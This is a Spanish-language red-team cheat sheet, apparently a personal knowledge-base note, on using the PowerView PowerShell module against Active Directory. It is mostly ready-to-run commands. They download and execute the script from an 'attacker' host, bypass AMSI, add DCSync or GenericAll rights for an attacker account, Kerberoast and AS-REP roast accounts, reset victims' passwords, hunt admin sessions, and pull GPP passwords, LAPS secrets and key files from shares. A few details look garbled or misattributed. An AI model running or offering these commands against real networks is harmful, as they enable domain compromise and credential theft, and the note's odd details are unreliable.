---
aliases:
  - PowerView
  - PowerView.ps1
  - PowerView-Dev
tags:
  - type/atomic
  - tool/powerview
  - technique/recon/active
  - technique/lateral-movement
  - env/windows
  - env/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Information Gathering]]"
tertiary categories:
  - "[[Active Directory Enumeration]]"
linked:
  - "[[Active Directory Exploitation]]"
  - "[[BloodHound & SharpHound]]"
  - "[[Rubeus]]"
  - "[[Kerberoasting]]"
  - "[[AS-REP Roasting]]"
  - "[[evil-winrm]]"
---
# PowerView

***

## Overview

Módulo PowerShell (**PowerSploit/GhostPack**) para enum + recon de AD. ActiveDirectory module sin `RSAT`, ADSI + LDAP crudo. Dos forks vivos:

- **PowerView.ps1** (legacy, clásico) — PowerSploit fork histórico.
- **PowerView-Dev** (Will Schroeder, GhostPack) — fork mantenido, funciones extendidas.

Carga typical: in-memory via `IEX`, `Invoke-Binary` (dnsCompilable) o `-s` flag de [[evil-winrm]].

> Regla: Muchas funciones tienen equivalente en `ActiveDirectory` module (Get-ADUser, etc.). PowerView es preferido cuando no hay RSAT, cuando querés flags no expuestos, o cuando necesitás offensive helpers (`Invoke-*`).

***

## Carga

### In-memory (web)

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
# TLS 1.2 si .NET 4.x con IIS moderno:
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
IEX ((New-Object Net.WebClient).DownloadString('https://attacker/PowerView.ps1'))
```

### Desde disco

```powershell
Import-Module .\PowerView.ps1
. .\PowerView.ps1
```

### AMSI

AMSI detecta PowerView por firmas. Bypasses:

- `Bypass-4MSI` (evil-winrm) antes del IEX.
- Load fork `PowerView-Dev` obfuscado.
- AMSI patch en runtime (ver [[evil-winrm]]).

***

## User / group enum

```powershell
# Users
Get-DomainUser                                      # todos
Get-DomainUser -Identity alice
Get-DomainUser -AdminCount                          # miembros históricos de Protected Users / DA
Get-DomainUser -SPN                                 # kerberoasteable
Get-DomainUser -PreauthNotRequired                  # ASREProasteable
Get-DomainUser -AllowDelegation                     # unconstrained/constrained
Get-DomainUser -LDAPFilter '(servicePrincipalName=*)' -Properties samaccountname,servicePrincipalName
Get-DomainUser -Properties lastlogon,pwdlastset
Get-DomainUser -SearchBase 'OU=IT,DC=domain,DC=local'

# Groups
Get-DomainGroup
Get-DomainGroup -Name 'Domain Admins'
Get-DomainGroupMember -Identity 'Domain Admins' -Recurse
Get-DomainGroupMember 'Enterprise Admins'

# Quién está en qué (reverse)
Get-DomainGroup -UserName alice                     # grupos del user

# Local groups remoto (SMB sin creds si null sessions)
Get-NetLocalGroup -ComputerName srv01
Get-NetLocalGroupMember -ComputerName srv01 -GroupName Administrators
```

***

## Computer / OU enum

```powershell
Get-DomainComputer
Get-DomainComputer -OperatingSystem '*Server 2019*'
Get-DomainComputer -Unconstrained                   # SeEnableDelegation flag
Get-DomainComputer -TrustedToAuth                   # Constrained Delegation
Get-DomainComputer -Properties dnshostname,operatingsystem

Get-DomainOU
Get-DomainOU -Identity 'IT' -Properties gplink      # GPOs linkeados
```

***

## Trusts / forest

```powershell
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping                              # recursivo — mapa completo
Get-NetForestDomain
Get-NetDomainController
Get-DomainSID
Get-NetForest
Get-NetForestCatalog                                # GCs
Get-DomainPolicy                                    # default domain policy
```

***

## GPO

```powershell
Get-DomainGPO
Get-DomainGPO -Identity '*Desktop*'
Get-DomainGPOLocalGroup                             # users agregados a local groups via GPO
Get-DomainGPOUserLocalGroupMapping -Identity alice  # dónde alice es local admin via GPO
Get-DomainGPOComputerLocalGroupMapping -Identity srv01
Find-InterestingDomainAcl -GPO
```

***

## ACL / permisos

```powershell
# ACLs de objeto
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs
Get-DomainObjectAcl -Identity alice -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (Get-DomainUser bob).objectsid}

# Quién tiene WriteDacl / GenericAll sobre DA
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ? {
  $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|AllExtendedRights'
}

# Buscar ACLs interesantes para el user actual
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match $env:USERNAME}

# Añadir ACL (abuse GenericAll / WriteDacl)
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights DCSync
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights ResetPassword

# Quitar (cleanup)
Remove-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All
```

***

## Password attacks

### Kerberoasting

```powershell
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
Invoke-Kerberoast -OutputFormat Hashcat -Domain domain.local
```

Preferir [[Rubeus]] `kerberoast` para opsec mejor.

### AS-REP Roasting

```powershell
Get-DomainUser -PreauthNotRequired -Properties samaccountname
Invoke-ASREPRoast
```

### Force-change password

```powershell
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'Newp@ss1' -AsPlainText -Force)
```

Requiere `User-Force-Change-Password` ACE.

***

## Session / user location (sin BloodHound)

```powershell
# Sesiones activas en host
Get-NetSession -ComputerName srv01
Get-NetLoggedon -ComputerName srv01              # users logueados interactivamente
Get-NetRDPSession -ComputerName srv01            # RDP sessions

# Hunt user en dominio — dónde está logueado DA?
Invoke-UserHunter -GroupName 'Domain Admins'
Invoke-UserHunter -UserName Administrator -ShowAll
Invoke-UserHunter -Stealth                        # solo SYSVOL path hosts
Invoke-ProcessHunter -UserName Administrator      # procesos del user en hosts
Invoke-EventHunter -UserName Administrator        # Event logs (requiere admin)
```

***

## Share enum

```powershell
Find-DomainShare                                  # todos los shares (excluye IPC$/admin$)
Find-DomainShare -CheckShareAccess                # accesibles para user actual
Find-InterestingDomainShareFile -Include *.kdbx,*.pfx,*.pem,*.config -Recurse
Find-DomainUserLocation
```

***

## Share ACL / SYSVOL

```powershell
Get-DomainGPPPassword                             # MS14-025 cPassword
Get-DomainGPPAutologon
```

***

## DNS records

```powershell
Get-DomainDNSZone
Get-DomainDNSRecord -ZoneName domain.local
```

***

## Queries ad-hoc

### Users con password nunca expira

```powershell
Get-DomainUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=65536)'
```

### Computers con SPN sospechoso

```powershell
Get-DomainComputer -LDAPFilter '(servicePrincipalName=*MSSQL*)'
```

### Fuzzy match descriptions

```powershell
Get-DomainUser -LDAPFilter '(description=*pass*)' -Properties description,samaccountname
```

### LAPS

```powershell
Get-DomainObject -LDAPFilter '(ms-MCS-AdmPwd=*)' -Properties ms-MCS-AdmPwd,dnshostname
```

### Computers sin LAPS (backdoor opportunity)

```powershell
Get-DomainComputer -LDAPFilter '(!(ms-MCS-AdmPwd=*))'
```

### Object modificado recientemente

```powershell
Get-DomainObject -LDAPFilter '(whenChanged>=20260101000000.0Z)'
```

***

## Delegation

```powershell
# Unconstrained
Get-DomainComputer -Unconstrained -Properties name,useraccountcontrol

# Constrained (T2A4D)
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# RBCD — quién puede impersonar qué
Get-DomainComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | ? {$_.'msds-allowedtoactonbehalfofotheridentity'}
```

Explotación ver [[Rubeus]] (s4u).

***

## Creación de objetos

```powershell
# Computer account (si MAQ > 0)
New-MachineAccount -MachineAccount 'FAKE$' -Password (ConvertTo-SecureString 'Passw0rd' -AsPlainText -Force)

# Group
New-DomainGroup -Identity 'FakeGroup' -Description 'test'
```

***

## Credential checks

```powershell
# Test cred via LDAP
$SecPass = ConvertTo-SecureString 'Passw0rd' -AsPlainText -Force
$Cred = New-Object PSCredential('domain\alice', $SecPass)
Get-DomainUser -Credential $Cred                  # valida + query

# O con Test-Credential (PowerView extension)
```

Uso con creds alternativas — todas las funciones aceptan `-Credential`:

```powershell
Get-DomainUser -Credential $Cred
Find-DomainShare -Credential $Cred
```

***

## Tips

- Siempre usar `-ResolveGUIDs` en `Get-DomainObjectAcl` para leer extended rights (DCSync = `GetChanges` + `GetChangesAll`).
- Paginación LDAP implícita. Use `-SearchBase` / `-SearchScope OneLevel` para queries grandes.
- `$PSDefaultParameterValues['*:Domain']='other.local'` para cross-domain.
- Funciones con prefijo `Get-Domain*` (fork moderno) vs `Get-Net*` (clásico). Misma función, nombres duales.
- Ver `Get-Help <function> -Examples` (si el .ps1 preservó comments).

***

## Equivalencias con BloodHound

Muchas queries Cypher de [[BloodHound Cypher Queries]] replicables localmente con PowerView — útil cuando no se puede exfiltrar SharpHound output o cuando se necesita data live.

***

## Referencias

- PowerView-Dev: https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1
- PowerSploit (legacy): https://github.com/PowerShellMafia/PowerSploit
- Harmj0y blog series: https://blog.harmj0y.net/tag/powerview/
